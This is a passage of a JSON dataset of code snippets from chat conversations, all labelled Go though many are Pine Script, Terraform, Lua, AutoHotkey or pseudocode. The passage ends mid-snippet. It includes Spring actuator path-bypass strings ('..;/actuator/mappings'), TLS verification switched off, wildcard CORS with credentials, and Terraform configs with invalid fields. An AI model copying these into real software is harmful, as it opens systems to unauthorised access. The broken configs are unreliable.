    "code": "package main\n\nimport (\n    \"fmt\"\n    \"encoding/json\"\n)\n\nfunc main() {\n    myMap := map[string]string{\"key1\": \"value1\", \"key2\": \"value2\"}\n    jsonString, err := json.Marshal(myMap)\n    if err != nil {\n        fmt.Println(\"Error:\", err)\n        return\n    }\n    fmt.Println(string(jsonString))\n}",
    "filename": "1692eda8d80f6b5082f5b9faffe3c91e_0.go"
  },
  {
    "conversation_hash": "1692eda8d80f6b5082f5b9faffe3c91e",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"strconv\"\n)\n\nfunc main() {\n\tstr := \"1234567890\"\n\tnum, err := strconv.ParseInt(str, 10, 64)\n\tif err != nil {\n\t\tfmt.Println(\"Error:\", err)\n\t\treturn\n\t}\n\tfmt.Println(\"Number:\", num)\n}",
    "filename": "1692eda8d80f6b5082f5b9faffe3c91e_1.go"
  },
  {
    "conversation_hash": "4751efa3ee72bf6eb28600f8f2e3bdaf",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "//@version=4\nstudy(\"Structural Pivots Method\", shorttitle=\"SPM\", overlay=true)\nn = input(2, minval=1, title=\"Number of bars for comparison\")\n\n// Small Pivot High and Small Pivot Low\nsmallPivotHigh = (high[2] < high[1] and high[1] > high) and (close[2] < close[1] and close[1] > close) \nsmallPivotLow = (low[2] > low[1] and low[1] < low) and (close[2] > close[1] and close[1] < close) \n\n// Mark small pivot high and small pivot low\nplotshape(smallPivotHigh? high : na, style=shape.arrowdown, location=location.abovebar, color=color.red)\nplotshape(smallPivotLow? low : na, style=shape.arrowup, location=location.belowbar, color=color.green)\n\n// Large Pivot High and Large Pivot Low\nvar float lph = na\nvar float lpl = na\n\n// Check if a new LPH or LPL is found\nlphFound = not na(lph[1]) and highestbars(high, bar_index - (bar_index[lph[1]])) >= 0\nlplFound = not na(lpl[1]) and lowestbars(low, bar_index - (bar_index[lpl[1]])) >= 0\n\n// Update LPH and LPL\nlph := lphFound and smallPivotHigh? high[1] : lph[1]\nlpl := lplFound and smallPivotLow? low[1] : lpl[1]\n\n// Mark large pivot high and large pivot low\nplotshape(lphFound? lph : na, style=shape.arrowup, location=location.belowbar, color=color.red, size = size.small)\nplotshape(lplFound? lpl : na, style=shape.arrowup, location=location.belowbar, color=color.green, size = size.small)",
    "filename": "4751efa3ee72bf6eb28600f8f2e3bdaf_0.go"
  },
  {
    "conversation_hash": "98f86d2c2e462129b4b947121ffba69e",
    "code_index": 16,
    "language": "Go",
    "libraries": [],
    "code": "c++\n// mylib.cpp\n\nint myfunc(int arg1) {\n    return arg1 + 1;\n}",
    "filename": "98f86d2c2e462129b4b947121ffba69e_16.go"
  },
  {
    "conversation_hash": "a7ef494ddb660e88fe7248a09b0146ec",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "url := \"https://example.com\"\nreq := fasthttp.AcquireRequest()\ndefer fasthttp.ReleaseRequest(req)\nreq.SetRequestURI(url)\nreq.Header.SetMethod(\"GET\")\nreq.Header.Set(\"User-Agent\", \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0\")\nreq.Header.Set(\"Accept-Encoding\", \"gzip, deflate, br\")\nreq.Header.Set(\"Connection\", \"keep-alive\")\nreq.Header.Set(\"Pragma\", \"no-cache\")\nreq.Header.Set(\"Cache-Control\", \"no-cache\")\n\n// 添加跳过TLS验证选项\ntlsConfig := &tls.Config{\n    InsecureSkipVerify: true,\n}\nclient := &fasthttp.Client{\n    TLSConfig: tlsConfig,\n}\nresp := fasthttp.AcquireResponse()\ndefer fasthttp.ReleaseResponse(resp)\nerr := client.Do(req, resp)\nif err != nil {\n    log.Printf(\"请求失败：%v\", err)\n} else {\n    log.Printf(\"请求成功，响应：%s\", resp.Body())\n}",
    "filename": "a7ef494ddb660e88fe7248a09b0146ec_0.go"
  },
  {
    "conversation_hash": "2e56cfb6592c833ff2ed83b51ab676b8",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "func CallCppFunc(param1 int, param2 string) int {\n    c_param2 := C.CString(param2)\n    defer C.free(unsafe.Pointer(c_param2))\n    result := int(C.cppFunc(C.int(param1), c_param2))\n    return result\n}",
    "filename": "2e56cfb6592c833ff2ed83b51ab676b8_1.go"
  },
  {
    "conversation_hash": "2e56cfb6592c833ff2ed83b51ab676b8",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "//export GoFunc\nfunc GoFunc(param1 int, param2 string) int {\n    // do something\n    return 0\n}",
    "filename": "2e56cfb6592c833ff2ed83b51ab676b8_2.go"
  },
  {
    "conversation_hash": "b3ae269c3fd26c007e5115e0c07b2cd4",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "// 添加前缀和后缀\nstr := \"actuator/mappings\"\nnewStr1 := \"..;/\"+str\nnewStr2 := str  // 不需要变换\nnewStr3 := \";\"+str\nnewStr4 := \"actuator/;\"+str\n\nfmt.Println(newStr1)  // 输出: ..;/actuator/mappings\nfmt.Println(newStr2)  // 输出: actuator/mappings\nfmt.Println(newStr3)  // 输出: ;actuator/mappings\nfmt.Println(newStr4)  // 输出: actuator/;mappings",
    "filename": "b3ae269c3fd26c007e5115e0c07b2cd4_0.go"
  },
  {
    "conversation_hash": "b3ae269c3fd26c007e5115e0c07b2cd4",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "// 使用字符串格式化\nstr := \"actuator/mappings\"\nnewStr1 := fmt.Sprintf(\"..;/%s\", str)\nnewStr2 := str  // 不需要变换\nnewStr3 := fmt.Sprintf(\";%s\", str)\nnewStr4 := fmt.Sprintf(\"actuator/;%s\", str)\n\nfmt.Println(newStr1)  // 输出: ..;/actuator/mappings\nfmt.Println(newStr2)  // 输出: actuator/mappings\nfmt.Println(newStr3)  // 输出: ;actuator/mappings\nfmt.Println(newStr4)  // 输出: actuator/;mappings",
    "filename": "b3ae269c3fd26c007e5115e0c07b2cd4_1.go"
  },
  {
    "conversation_hash": "c8c7786617e8de1ddfa1494552c129fb",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "-- Makefile 示例\nproject \"myproject\"\n    kind \"ConsoleApp\"\n    language \"C++\"\n    targetdir \"bin\"\n\n    files { \"src/*.cpp\" }\n\n    -- 建立 mylib 项目的依赖关系\n    dependson { \"mylib\" }\n\n    -- 添加 mylib 库的依赖关系，并自动设置库以及头文件路径\n    links { \"mylib\" }\n    includedirs { \"$(PROJECT_DIR)/../mylib/include\" }\n\n    -- 设置编译和链接选项\n    buildoptions { \"-Wall\", \"-std=c++11\" }\n    linkoptions { \"-L$(PROJECT_DIR)/../mylib/lib\", \"-lmylib\" }",
    "filename": "c8c7786617e8de1ddfa1494552c129fb_4.go"
  },
  {
    "conversation_hash": "6cdd9f9778b5abbad1d9a01afd5e4b64",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "staticlib \"foo\"\n    targetdir \"/path/to/foo/lib\"\n    includedirs \"/path/to/foo/include\"\n    files {\n        \"/path/to/foo/src/**.cpp\",\n        \"/path/to/foo/include/**.h\",\n    }\n    links {\n        \"bar\"\n    }",
    "filename": "6cdd9f9778b5abbad1d9a01afd5e4b64_0.go"
  },
  {
    "conversation_hash": "b00e92fb679301181049add170eacdd8",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "// Создаем таблицу для хранения результатов подзадач\nvalueTable := создать двумерную таблицу, где строки соответствуют предметам и столбцы соответствуют вместимости рюкзака\n\n// Заполняем первую строку таблицы\nfor j := 0 to максимальная вместимость рюкзака do:\n    if вес первого предмета <= j then:\n        valueTable[1,j] := ценность первого предмета\n    else:\n        valueTable[1,j] := 0\n\n// Заполняем оставшиеся ячейки таблицы\nfor i := 2 to количество предметов do:\n    for j := 0 to максимальная вместимость рюкзака do:\n        if вес предмета <= j then:\n            valueTable[i,j] := max(valueTable[i-1,j], valueTable[i-1,j-вес предмета] + ценность предмета)\n        else:\n            valueTable[i,j] := valueTable[i-1,j]\n\n// Возвращаем максимальную стоимость\nreturn valueTable[количество предметов ,максимальная вместимость рюкзака]",
    "filename": "b00e92fb679301181049add170eacdd8_3.go"
  },
  {
    "conversation_hash": "ccdb28214898ed293984e59f01ca8f8d",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "# Define the provider and region\nprovider \"aws\" {\n  region = \"us-west-2\"\n}\n\n# Create an S3 bucket for the static website\nresource \"aws_s3_bucket\" \"static_website\" {\n  bucket = \"example-static-website-bucket\"\n  acl    = \"public-read\"\n\n  website {\n    index_document = \"index.html\"\n    error_document = \"error.html\"\n  }\n}\n\n# Set up an S3 bucket policy to allow CloudFront to access the bucket\nresource \"aws_s3_bucket_policy\" \"static_website_policy\" {\n  bucket = aws_s3_bucket.static_website.id\n\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Effect = \"Allow\"\n        Principal = {\n          AWS = \"arn:aws:iam::cloudfront:user/CloudFront Origin Access Identity ${aws_cloudfront_origin_access_identity.cloudfront_oai.id}\"\n        }\n        Action = \"s3:GetObject\"\n        Resource = \"${aws_s3_bucket.static_website.arn}/*\"\n      }\n    ]\n  })\n}\n\n# Create a CloudFront distribution to serve the static website\nresource \"aws_cloudfront_distribution\" \"static_website_distribution\" {\n  origin {\n    domain_name = aws_s3_bucket.static_website.bucket_regional_domain_name\n    origin_id   = \"s3-origin\"\n  }\n\n  enabled             = true\n  is_ipv6_enabled     = true\n  comment             = \"Static website distribution\"\n  default_root_object = \"index.html\"\n  \n  # Associate the S3 bucket policy with the distribution\n  default_cache_behavior {\n    target_origin_id = \"s3-origin\"\n    forwarded_values {\n      query_string = false\n\n      cookies {\n        forward = \"none\"\n      }\n    }\n\n    viewer_protocol_policy = \"redirect-to-https\"\n\n    # Whitelist the required headers in the response\n    allowed_headers = [\n      \"Host\",\n      \"Access-Control-Request-Headers\",\n      \"Access-Control-Request-Method\",\n      \"Origin\",\n    ]\n\n    # Whitelist the required methods for CORS\n    allowed_methods = [\n      \"GET\",\n      \"HEAD\",\n      \"OPTIONS\"\n    ]\n\n    # Whitelist the required origins for CORS\n    allowed_origins = [\n      \"https://example.com\",\n      \"https://www.example.com\"\n    ]\n  }\n\n  # Define the cache settings\n  viewer_certificate {\n    acm_certificate_arn = \"arn:aws:acm:us-west-2:123456789012:certificate/abcdefg-1234-5678-90ab-cdef12345678\"\n    ssl_support_method  = \"sni-only\"\n  }\n\n  # Define the origin access identity for CloudFront\n  # This ensures the S3 bucket is not publicly accessible\n  restrictions {\n    geo_restriction {\n      restriction_type = \"none\"\n    }\n\n    viewer_certificate {\n      cloudfront_default_certificate = true\n    }\n\n    aws_account_number = \"${data.aws_caller_identity.current.account_id}\"\n    include_body       = true\n\n    # Assign the CloudFront OAI to the S3 bucket ACL\n    origin_access_identity = aws_cloudfront_origin_access_identity.cloudfront_oai.cloudfront_access_identity_path\n  }\n\n  # Define the hostname and DNS records for Route 53\n  aliases {\n    enabled = true\n    # Use a custom CloudFront domain name or the default one\n    # domain_name = \"example.cloudfront.net\"\n    # Alternatively, use a Route 53 alias to the CloudFront distribution\n    names = [\n      \"example.com\",\n      \"www.example.com\"\n    ]\n\n    # Create a Route 53 record set for the alias\n    evaluate_target_health = true\n    zone_id                = aws_route53_zone.example.id\n  }\n\n  # Define the caching behavior for CloudFront\n  cache_behaviors {\n    path_pattern = \"/images/*\"\n    target_origin_id = \"s3-origin\"\n    allowed_methods = [\n      \"GET\",\n      \"HEAD\"\n    ]\n    cached_methods = [\n      \"GET\",\n      \"HEAD\"\n    ]\n    viewer_protocol_policy = \"redirect-to-https\"\n    compress                = true\n  }\n}\n\n# Create an origin access identity for CloudFront\nresource \"aws_cloudfront_origin_access_identity\" \"cloudfront_oai\" {\n  comment = \"Origin access identity for S3 bucket\"\n}\n\n# Create a Route 53 hosted zone\nresource \"aws_route53_zone\" \"example\" {\n  name = \"example.com.\"\n}\n\n# Create a DNS alias for the CloudFront distribution\nresource \"aws_route53_record\" \"cloudfront_alias\" {\n  zone_id = aws_route53_zone.example.id\n  name    = \"example.com\"\n  type    = \"A\"\n  alias {\n    name                   = aws_cloudfront_distribution.static_website_distribution.domain_name\n    zone_id                = aws_cloudfront_distribution.static_website_distribution.hosted_zone_id\n    evaluate_target_health = true\n  }\n}",
    "filename": "ccdb28214898ed293984e59f01ca8f8d_0.go"
  },
  {
    "conversation_hash": "ccdb28214898ed293984e59f01ca8f8d",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "# Define the provider and region\nprovider \"aws\" {\n  region = \"eu-west-1\"\n}\n\n# Create an S3 bucket for the static website\nresource \"aws_s3_bucket\" \"static_website\" {\n  bucket = \"www.openai.com\"\n  acl    = \"public-read\"\n\n  website {\n    index_document = \"index.html\"\n    error_document = \"error.html\"\n  }\n}\n\n# Set up an S3 bucket policy to allow CloudFront to access the bucket\nresource \"aws_s3_bucket_policy\" \"static_website_policy\" {\n  bucket = aws_s3_bucket.static_website.id\n\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Effect = \"Allow\"\n        Principal = {\n          AWS = \"arn:aws:iam::cloudfront:user/CloudFront Origin Access Identity ${aws_cloudfront_origin_access_identity.cloudfront_oai.id}\"\n        }\n        Action = \"s3:GetObject\"\n        Resource = \"${aws_s3_bucket.static_website.arn}/*\"\n      }\n    ]\n  })\n}\n\n# Create a CloudFront distribution to serve the static website\nresource \"aws_cloudfront_distribution\" \"static_website_distribution\" {\n  origin {\n    domain_name = aws_s3_bucket.static_website.bucket_regional_domain_name\n    origin_id   = \"s3-origin\"\n  }\n\n  enabled             = true\n  is_ipv6_enabled     = true\n  comment             = \"Static website distribution\"\n  default_root_object = \"index.html\"\n  \n  # Associate the S3 bucket policy with the distribution\n  default_cache_behavior {\n    target_origin_id = \"s3-origin\"\n    forwarded_values {\n      query_string = false\n\n      cookies {\n        forward = \"none\"\n      }\n    }\n\n    viewer_protocol_policy = \"redirect-to-https\"\n\n    # Whitelist the required headers in the response\n    allowed_headers = [\n      \"Host\",\n      \"Access-Control-Request-Headers\",\n      \"Access-Control-Request-Method\",\n      \"Origin\",\n    ]\n\n    # Whitelist the required methods for CORS\n    allowed_methods = [\n      \"GET\",\n      \"HEAD\",\n      \"OPTIONS\"\n    ]\n\n    # Whitelist the required origins for CORS\n    allowed_origins = [\n      \"https://www.openai.com\"\n    ]\n  }\n\n  # Define the cache settings\n  viewer_certificate {\n    acm_certificate_arn = \"arn:aws:acm:eu-west-1:123456789012:certificate/abcdefg-1234-5678-90ab-cdef12345678\"\n    ssl_support_method  = \"sni-only\"\n  }\n\n  # Define the origin access identity for CloudFront\n  # This ensures the S3 bucket is not publicly accessible\n  restrictions {\n    geo_restriction {\n      restriction_type = \"none\"\n    }\n\n    viewer_certificate {\n      cloudfront_default_certificate = true\n    }\n\n    aws_account_number = \"${data.aws_caller_identity.current.account_id}\"\n    include_body       = true\n\n    # Assign the CloudFront OAI to the S3 bucket ACL\n    origin_access_identity = aws_cloudfront_origin_access_identity.cloudfront_oai.cloudfront_access_identity_path\n  }\n\n  # Define the hostname and DNS records for Route 53\n  aliases {\n    enabled = true\n    # Use a custom CloudFront domain name or the default one\n    # domain_name = \"example.cloudfront.net\"\n    # Alternatively, use a Route 53 alias to the CloudFront distribution\n    names = [\n      \"www.openai.com\",\n    ]\n\n    # Create a Route 53 record set for the alias\n    evaluate_target_health = true\n    zone_id                = aws_route53_zone.example.id\n  }\n\n  # Define the caching behavior for CloudFront\n  cache_behaviors {\n    path_pattern = \"/images/*\"\n    target_origin_id = \"s3-origin\"\n    allowed_methods = [\n      \"GET\",\n      \"HEAD\"\n    ]\n    cached_methods = [\n      \"GET\",\n      \"HEAD\"\n    ]\n    viewer_protocol_policy = \"redirect-to-https\"\n    compress                = true\n  }\n}\n\n# Create an origin access identity for CloudFront\nresource \"aws_cloudfront_origin_access_identity\" \"cloudfront_oai\" {\n  comment = \"Origin access identity for S3 bucket\"\n}\n\n# Create a Route 53 hosted zone\nresource \"aws_route53_zone\" \"example\" {\n  name = \"openai.com\"\n}\n\n# Create a DNS alias for the CloudFront distribution\nresource \"aws_route53_record\" \"cloudfront_alias\" {\n  zone_id = aws_route53_zone.example.id\n  name    = \"www\"\n  type    = \"CNAME\"\n  ttl     = \"300\"\n  records = [\n    aws_cloudfront_distribution.static_website_distribution.domain_name,\n  ]\n}",
    "filename": "ccdb28214898ed293984e59f01ca8f8d_1.go"
  },
  {
    "conversation_hash": "dd956dd6a61532a84134ed14bee4bba7",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"io/ioutil\"\n    \"os\"\n)\n\nfunc main() {\n    // 创建名为 hello.txt 的文件，如果它不存在\n    file, err := os.Create(\"hello.txt\")\n    if err != nil {\n        panic(err)\n    }\n    \n    // 构造一个要写入的字符串\n    content := \"Hello, world!\"\n    \n    // 将字符串写入文件\n    _, err = file.WriteString(content)\n    if err != nil {\n        file.Close()\n        panic(err)\n    }\n\n    // 关闭文件\n    err = file.Close()\n    if err != nil {\n        panic(err)\n    }\n}",
    "filename": "dd956dd6a61532a84134ed14bee4bba7_4.go"
  },
  {
    "conversation_hash": "53cd13021300fa859b821c24c4e36e67",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "resource \"helm_release\" \"argocd\" {\n  # Your existing configuration\n  \n  lifecycle {\n    ignore_changes = [\n      metadata[0].annotations[\"meta.helm.sh/release-name\"]\n    ]\n  }\n}",
    "filename": "53cd13021300fa859b821c24c4e36e67_0.go"
  },
  {
    "conversation_hash": "4ae45565048a8d241ce277556c82bf3c",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "xl := ComObjCreate(\"Excel.Application\")\nxl.Visible := true\nwb := xl.Workbooks.Add()\nws := wb.Worksheets(1)\nws.Range(\"A1\").Value := \"ID\"\nws.Range(\"B1\").Value := \"Name\"\nws.Range(\"C1\").Value := \"Email\"\nws.Range(\"A2\").Value := \"1\"\nws.Range(\"B2\").Value := \"John\"\nws.Range(\"C2\").Value := \"john@example.com\"\nwb.SaveAs(\"C:\\example.xlsx\")\nwb.Close()\nxl.Quit()",
    "filename": "4ae45565048a8d241ce277556c82bf3c_0.go"
  },
  {
    "conversation_hash": "1d277cc22e78eda7c0a1745062b6b3bc",
    "code_index": 12,
    "language": "Go",
    "libraries": [],
    "code": "buildscript {\n    repositories {\n        google()\n        jcenter()\n    }\n    dependencies {\n        classpath 'com.android.tools.build:gradle:7.3.3'\n    }\n}\n\nallprojects {\n    repositories {\n        google()\n        jcenter()\n    }\n}",
    "filename": "1d277cc22e78eda7c0a1745062b6b3bc_12.go"
  },
  {
    "conversation_hash": "e9f2e5adc6465c01b64cacf9a49fd310",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"context\"\n\t\"fmt\"\n\t\"log\"\n\t\"net/http\"\n\n\t\"github.com/gin-gonic/gin\"\n\t\"github.com/go-redis/redis/v8\"\n\t\"github.com/googollee/go-socket.io\"\n\t\"github.com/nats-io/nats.go\"\n)\n\nvar ctx = context.Background()\n\n// Post структура для демонстрации CRUD\ntype Post struct {\n\tID      string `json:\"id\"`\n\tTitle   string `json:\"title\"`\n\tContent string `json:\"content\"`\n}\n\nvar posts = []Post{\n\t{\n\t\tID:      \"1\",\n\t\tTitle:   \"First Post\",\n\t\tContent: \"This is the content of the first post.\",\n\t},\n}\n\nfunc main() {\n\t// Инициализация приложения Gin\n\tr := gin.Default()\n\n\tsocketServer, err := socketio.NewServer(nil)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tsocketServer.OnConnect(\"/\", func(s socketio.Conn) error {\n\t\tlog.Printf(\"Connected Socket ID: %s\", s.ID())\n\t\ts.Join(\"room\")\n\t\ts.Emit(\"message\", \"Welcome to the chat room\")\n\t\treturn nil\n\t})\n\n\tsocketServer.OnEvent(\"/\", \"message\", func(s socketio.Conn, msg string) {\n\t\tlog.Printf(\"Received message from %s: %s\\n\", s.ID(), msg)\n\t\tsocketServer.BroadcastToRoom(\"\", \"room\", \"message\", msg)\n\t})\n\n\tsocketServer.OnError(\"/\", func(s socketio.Conn, e error) {\n\t\tlog.Println(\"Error with socket connection:\", e)\n\t})\n\n\tsocketServer.OnDisconnect(\"/\", func(s socketio.Conn, reason string) {\n\t\tlog.Printf(\"Disconnected Socket ID: %s\", s.ID())\n\t})\n\n\tr.GET(\"/socket.io/*any\", gin.WrapH(socketServer))\n\tr.POST(\"/socket.io/*any\", gin.WrapH(socketServer))\n\n\tnc, err := nats.Connect(nats.DefaultURL)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdefer nc.Close()\n\n\trdb := redis.NewClient(&redis.Options{\n\t\tAddr:     \"localhost:6379\",\n\t\tPassword: \"\",\n\t\tDB:       0,\n\t})\n\n\tpong, err := rdb.Ping(ctx).Result()\n\tfmt.Println(pong, err)\n\n\tr.GET(\"/posts\", func(c *gin.Context) {\n\t\tc.JSON(http.StatusOK, posts)\n\t})\n\n\tr.POST(\"/posts\", func(c *gin.Context) {\n\t\tvar post Post\n\t\tif err := c.BindJSON(&post); err != nil {\n\t\t\tc.JSON(http.StatusBadRequest, gin.H{\"error\": err.Error()})\n\t\t\treturn\n\t\t}\n\n\t\tposts = append(posts, post)\n\t\tc.JSON(http.StatusCreated, post)\n\n\t\tsocketServer.BroadcastToRoom(\"\", \"room\", \"post\", post)\n\t})\n\n\tr.PUT(\"/posts/:id\", func(c *gin.Context) {\n\t\tid := c.Param(\"id\")\n\t\tvar updatedPost Post\n\t\tif err := c.BindJSON(&updatedPost); err != nil {\n\t\t\tc.JSON(http.StatusBadRequest, gin.H{\"error\": err.Error()})\n\t\t\treturn\n\t\t}\n\n\t\tfor i, p := range posts {\n\t\t\tif p.ID == id {\n\t\t\t\tposts[i].Title = updatedPost.Title\n\t\t\t\tposts[i].Content = updatedPost.Content\n\t\t\t\tc.JSON(http.StatusOK, posts[i])\n\t\t\t\treturn\n\t\t\t}\n\t\t}\n\n\t\tc.JSON(http.StatusNotFound, gin.H{\"error\": \"Post not found\"})\n\t})\n\n\tr.DELETE(\"/posts/:id\", func(c *gin.Context) {\n\t\tid := c.Param(\"id\")\n\n\t\tfor i, p := range posts {\n\t\t\tif p.ID == id {\n\t\t\t\tposts = append(posts[:i], posts[i+1:]...)\n\t\t\t\tc.String(http.StatusOK, \"Post deleted\")\n\t\t\t\treturn\n\t\t\t}\n\t\t}\n\n\t\tc.JSON(http.StatusNotFound, gin.H{\"error\": \"Post not found\"})\n\t})\n\n\tr.GET(\"/healthz\", func(c *gin.Context) {\n\t\t// Запрос к Redis\n\t\t_, err := rdb.Ping(ctx).Result()\n\t\tif err != nil {\n\t\t\tc.String(http.StatusServiceUnavailable, err.Error())\n\t\t\treturn\n\t\t}\n\n\t\t// Запрос к NATS\n\t\tif status := nc.Status(); status != nats.CONNECTED {\n\t\t\tc.String(http.StatusServiceUnavailable, \"NATS not connected\")\n\t\t\treturn\n\t\t}\n\n\t\tc.String(http.StatusOK, \"OK\")\n\t})\n\n\tr.Run(\":8080\")\n}",
    "filename": "e9f2e5adc6465c01b64cacf9a49fd310_1.go"
  },
  {
    "conversation_hash": "e9f2e5adc6465c01b64cacf9a49fd310",
    "code_index": 7,
    "language": "Go",
    "libraries": [],
    "code": "sio, err := socketio.NewSocketIOServer(socketio.DefaultConfig)\nif err != nil {\n\tlog.Fatal(err)\n}\n\nsio.On(\"connection\", func(so socketio.Socket) {\n\tfmt.Printf(\"[%s] %s\\n\", so.Id(), \"connected\")\n\tso.BroadcastTo(\"room\", \"message\", \"Welcome to the chat room\")\n\n\t// Обработчик сообщений\n\tso.On(\"message\", func(msg string) {\n\t\tfmt.Printf(\"[%s] %s: %s\\n\", so.Id(), \"message\", msg)\n\t\tso.BroadcastTo(\"room\", \"message\", msg)\n\t})\n\n\t// Обработчик отключений\n\tso.On(\"disconnection\", func() {\n\t\tfmt.Printf(\"[%s] %s\\n\", so.Id(), \"disconnected\")\n\t})\n\n})",
    "filename": "e9f2e5adc6465c01b64cacf9a49fd310_7.go"
  },
  {
    "conversation_hash": "e9f2e5adc6465c01b64cacf9a49fd310",
    "code_index": 10,
    "language": "Go",
    "libraries": [],
    "code": "r.Use(func(c *gin.Context) {\n\tc.Header(\"Access-Control-Allow-Origin\", \"*\")\n\tc.Header(\"Access-Control-Allow-Headers\", \"Content-Type, Token\")\n\tc.Header(\"Access-Control-Allow-Methods\", \"GET, POST, OPTIONS\")\n\tc.Header(\"Access-Control-Expose-Headers\", \"Content-Length, Access-Control-Allow-Origin, Access-Control-Allow-Headers, Content-Type\")\n\tc.Header(\"Access-Control-Allow-Credentials\", \"true\")\n\t\n\tif c.Request.Method == \"OPTIONS\" {\n\t\tc.AbortWithStatus(http.StatusNoContent)\n\t\treturn\n\t}\n\n\tc.Next()\n})",
    "filename": "e9f2e5adc6465c01b64cacf9a49fd310_10.go"
  },
  {
    "conversation_hash": "e9f2e5adc6465c01b64cacf9a49fd310",
    "code_index": 15,
    "language": "Go",
    "libraries": [],
    "code": "app := gosf.NewApp()\n\napp.OnConnect(func(client *gosf.Client) {\n    log.Printf(\"Connected client ID: %s\\n\", client.Id())\n})\n\napp.OnDisconnect(func(client *gosf.Client) {\n    log.Printf(\"Disconnected client ID: %s\\n\", client.Id())\n})\n\napp.Register(\"message\", func(c *gosf.Client, r interface{}) {\n    log.Printf(\"Received message from %s: %v\\n\", c.Id(), r)\n    app.Broadcast(\"message\", r)\n})\n\ngo func() {\n    if err := app.Start(\"8081\"); err != nil {\n        log.Fatal(err)\n    }\n}()",
    "filename": "e9f2e5adc6465c01b64cacf9a49fd310_15.go"
  },
  {
    "conversation_hash": "e9f2e5adc6465c01b64cacf9a49fd310",
    "code_index": 18,
    "language": "Go",
    "libraries": [],
    "code": "app := gosf.NewApp()\n\napp.OnConnect(func(client *gosf.Client) {\n\tlog.Printf(\"Connected client ID: %s\\n\", client.Id())\n})\n\napp.OnDisconnect(func(client *gosf.Client) {\n\tlog.Printf(\"Disconnected client ID: %s\\n\", client.Id())\n})\n\napp.Register(\"message\", func(c *gosf.Client, r interface{}) {\n\tlog.Printf(\"Received message from %s: %v\\n\", c.Id(), r)\n\tapp.Broadcast(\"message\", r)\n})\n\n// Gin обработчик для обслуживания GOSF клиентов\nr.GET(\"/socket/*any\", func(c *gin.Context) {\n\tapp.ClientInbound(c.Writer, c.Request)\n})\n\n// Gin обработчик для отправки сообщений GOSF клиентам\nr.POST(\"/socket/*any\", func(c *gin.Context) {\n\tapp.ClientInbound(c.Writer, c.Request)\n})",
    "filename": "e9f2e5adc6465c01b64cacf9a49fd310_18.go"
  },
  {
    "conversation_hash": "e9f2e5adc6465c01b64cacf9a49fd310",
    "code_index": 20,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"context\"\n\t\"fmt\"\n\t\"log\"\n\n\t\"github.com/ambelovsky/gosf\"\n\t\"github.com/gin-gonic/gin\"\n\t\"github.com/go-redis/redis/v8\"\n\t\"github.com/nats-io/nats.go\"\n)\n\nvar ctx = context.Background()\n\n// Post структура для демонстрации CRUD\ntype Post struct {\n\tID      string `json:\"id\"`\n\tTitle   string `json:\"title\"`\n\tContent string `json:\"content\"`\n}\n\nvar posts = []Post{\n\t{\n\t\tID:      \"1\",\n\t\tTitle:   \"First Post\",\n\t\tContent: \"This is the content of the first post.\",\n\t},\n}\n\nfunc main() {\n\t// Инициализация приложения Gin\n\tr := gin.Default()\n\n\t//--- Интегриция GOSF с Gin --- начало\n\tapp := gosf.NewApp()\n\n\tapp.OnConnect(func(client *gosf.Client) {\n\t\tlog.Printf(\"Connected client ID: %s\\n\", client.Id())\n\t})\n\n\tapp.OnDisconnect(func(client *gosf.Client) {\n\t\tlog.Printf(\"Disconnected client ID: %s\\n\", client.Id())\n\t})\n\n\tapp.Register(\"message\", func(c *gosf.Client, r interface{}) {\n\t\tlog.Printf(\"Received message from %s: %v\\n\", c.Id(), r)\n\t\tapp.Broadcast(\"message\", r)\n\t})\n\n\t// Gin обработчик для обслуживания GOSF клиентов\n\tr.GET(\"/socket/*any\", func(c *gin.Context) {\n\t\tapp.ClientInbound(c.Writer, c.Request)\n\t})\n\n\t// Gin обработчик для отправки сообщений GOSF клиентам\n\tr.POST(\"/socket/*any\", func(c *gin.Context) {\n\t\tapp.ClientInbound(c.Writer, c.Request)\n\t})\n\t//--- Интеграция GOSF с Gin закончена\n\n\tnc, err := nats.Connect(nats.DefaultURL)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdefer nc.Close()\n\n\trdb := redis.NewClient(&redis.Options{\n\t\tAddr:     \"localhost:6379\",\n\t\tPassword: \"\",\n\t\tDB:       0,\n\t})\n\n\tpong, err := rdb.Ping(ctx).Result()\n\tfmt.Println(pong, err)\n\n\tr.GET(\"/posts\", func(c *gin.Context) {\n\t\tc.JSON(http.StatusOK, posts)\n\t})\n\n\tr.POST(\"/posts\", func(c *gin.Context) {\n\t\tvar post Post\n\t\tif err := c.BindJSON(&post); err != nil {\n\t\t\tc.JSON(http.StatusBadRequest, gin.H{\"error\": err.Error()})\n\t\t\treturn\n\t\t}\n\n\t\tposts = append(posts, post)\n\t\tc.JSON(http.StatusCreated, post)\n\t})\n\n\tr.PUT(\"/posts/:id\", func(c *gin.Context) {\n\t\tid := c.Param(\"id\")\n\t\tvar updatedPost Post\n\t\tif err := c.BindJSON(&updatedPost); err != nil {\n\t\t\tc.JSON(http.StatusBadRequest, gin.H{\"error\": err.Error()})\n\t\t\treturn\n\t\t}\n\n\t\tfor i, p := 